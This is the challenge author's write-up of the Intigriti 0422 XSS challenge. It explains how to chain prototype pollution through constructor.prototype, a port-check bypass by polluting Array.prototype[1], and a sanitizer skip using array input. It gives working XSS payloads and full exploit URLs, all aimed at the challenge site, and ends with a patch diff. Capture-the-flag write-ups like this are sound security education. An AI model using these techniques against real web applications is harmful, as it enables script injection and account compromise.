---
title: Intigriti 0422 XSS Challenge Author Writeup
date: 2022-04-25 08:20:16
tags: [Security]
categories: [Security]
translator: huli
---

<img src="/img/intigriti-0422-xss-challenge-author-writeup/cover-en.png" style="display:none">

Challenge URL: https://challenge-0422.intigriti.io/

<!-- more -->

## Solution

TL;DR

1. Pollute Array.prototype via `merge` function
2. Bypass `checkHost()`
3. Set `innerHTML` and bypass `sanitize()` to perform XSS

### Step1. Prototype pollution on Array.prototype

First, let's take a look at the `merge` function:

``` js
function merge(target, source) {
  let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"]

  for(let key in source) {
    if (protectedKeys.includes(key)) continue

    if (isPrimitive(target[key])) {
      target[key] = sanitize(source[key])
    } else {
      merge(target[key], source[key])
    }
  }
}

function sanitize(data) {
  if (typeof data !== 'string') return data
  return data.replace(/[<>%&\$\s\\]/g, '_').replace(/script/gi, '_')
}
```

In the `merge` function, `__proto__` is blocked, but we can bypass it using `constructor.prototype`.

Then, below is the key of the first step:

``` js
const qs = m.parseQueryString(location.search)

let appConfig = Object.create(null)
appConfig["version"] = 1337
appConfig["mode"] = "production"
appConfig["window-name"] = "Window"
appConfig["window-content"] = "default content"
appConfig["window-toolbar"] = ["close"]
appConfig["window-statusbar"] = false
appConfig["customMode"] = false

if (qs.config) {
  merge(appConfig, qs.config)
  appConfig["customMode"] = true
}
```

Although we can't pollute `Object.prototype` because `appConfig` is created from `Object.create(null)`, we can pollute `Array.prototype` via `appConfig['window-toolbar']` which is an array!

So, we can pollute `Array.prototype` by providing a config object like this:

```
config[window-toolbar][constructor][prototype][0]=abc
// equals to ['close'].constructor.prototype.0 = 'abc'
```

But the question is, what property should be polluted? 

### Step2. Bypass checkHost

There is another call to `merge`, and it's the second part of the challenge:

``` js
function checkHost() {
  const temp = location.host.split(':')
  const hostname = temp[0]
  const port = Number(temp[1]) || 443
  return hostname === 'localhost' || port === 8080
}

let devSettings = Object.create(null)
devSettings["root"] = document.createElement('main')
devSettings["isDebug"] = false
devSettings["location"] = 'challenge-0422.intigriti.io'
devSettings["isTestHostOrPort"] = false

if (checkHost()) {
  devSettings["isTestHostOrPort"] = true
  merge(devSettings, qs.settings)
}
```

We need to make `checkHost()` return `true` to perform another merge call. 

In `checkHost`, it checks if hostname is localhost or port is 8080, let's take a closer look at the check:

``` js
function checkHost() {
  const temp = location.host.split(':')
  const hostname = temp[0]
  const port = Number(temp[1]) || 443
  return hostname === 'localhost' || port === 8080
}
```

It seems invulnerable, but what if `location.host` has no port?

For example, assumed `location.host` is `intigriti.io`, then `temp` becomes `['intigriti.io']`, and `temp[1]` is `undefined` because the length of the array is 1.

Here comes a cool way to bypass the check, what if `Array.prototype[1]` has been polluted? 

The JavaScript engine will look up `Array.prototype[1]` since `temp` has no property `1`. So, combined with the step1, we can pollute `Array.prototype[1]` to bypass the check:

```
config[window-toolbar][constructor][prototype][1]=8080
```

By the way, I got this idea from another challenge called `vm-calc` made by [@Strellic_](https://twitter.com/Strellic_) in DiceCTF 2022, kudos to the creator.

### Step3. Override innerHTML

After bypass the check, we have another merge call:

``` js
let devSettings = Object.create(null)
devSettings["root"] = document.createElement('main')
devSettings["isDebug"] = false
devSettings["location"] = 'challenge-0422.intigriti.io'
devSettings["isTestHostOrPort"] = false

if (checkHost()) {
  devSettings["isTestHostOrPort"] = true
  merge(devSettings, qs.settings)
}
```

`devSettings["root"]` is an HTML element, so we can use `?settings[root][innerHTML]` to set it's innerHTML and try to perform XSS.

But, it's not gonna work for two reasons.

First, there is a `sanitize` function for filtering `<` and `>`.

Second, the element only inserted to DOM after `m.mount()`, the content will be override by mithril.js


For the first issue, we can resolve it by using a bug in `sanitize` function:

``` js
function sanitize(data) {
  if (typeof data !== 'string') return data
  return data.replace(/[<>%&\$\s\\]/g, '_').replace(/script/gi, '_')
}
```

What if `data` is an array? For example, `['<a>hello</a>']`?

Because it's not a string, so it won't be sanitized, the function just return the original value. When you assign this array to `innerHTML`, it casts to string.

So, we can use `?settings[root][innerHTML][0]=<svg onload=alert(1)>` to bypass the sanitizer.

We are close to the end but need to address the last issue. The content of the element will be override by `m.mount` so our payload in `innerHTML` won't work, how should we resolve this?

The idea is simple, what if we can set `innerHTML` to `document.body` instead of `<main>`? Then our payload won't be override by mithril.js

There is a property called [ownerDocument](https://developer.mozilla.org/zh-TW/docs/Web/API/Node/ownerDocument), we can access `document` via this.

So, we can set innerHTML on body and perform XSS this way:

```
config[window-toolbar][constructor][prototype][1]=8080
settings[root][ownerDocument][body][innerHTML][0]=<svg onload=alert(document.domain)>
```

URL:
https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&settings[root][ownerDocument][body][innerHTML][0]=%3Cstyle%20onload%3Dalert(document.domain)%3E

There is another magic to solve the issue without overriding `document.body.innerHTML`.

As pointed out [here](https://github.com/terjanq/Tiny-XSS-Payloads/blob/5e8603974ef878e1230ae05e7f79b9467d862e2c/payloads.js#L93), `<img src=x onerror=alert(1)>` works even before inserted into the DOM. We can use this magic to set `root.innerHTML` and get XSS.

URL:
https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&settings[root][innerHTML][0]=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E

## Plot twist

What if I told you that all the solutions above are unintended?

The challenge was easier than I thought because I made a few bugs, making the intended solution unnecessary and redundant. It’s like there should be five steps for solving the challenge, but you can solve it in step2 because of the bugs.

The challenge should be more complex and interesting.

So, here comes **the revenge of Intigriti 0422 challenge**!

I patched the bugs and hosted the fixed challenge on GitHub, here is the challenge URL: https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422

You can found the diff below:

``` diff
function sanitize(data) {
- if (typeof data !== 'string') return data
+ if (typeof data !== 'string') data = String(data)

function merge(target, source) {
- let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"]
+ let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m", "Object"]
```

The revenge of Intigriti 0422 challenge runs until `2022-05-01T23:59:59+00:00`, you can DM me on [Twitter](https://twitter.com/aszx87410) if you find the solution.

Please noted that the revenge of Intigriti 0422 challenge is a challenge **hosted by my own, not Intigriti**, so there is no swag voucher for the winners.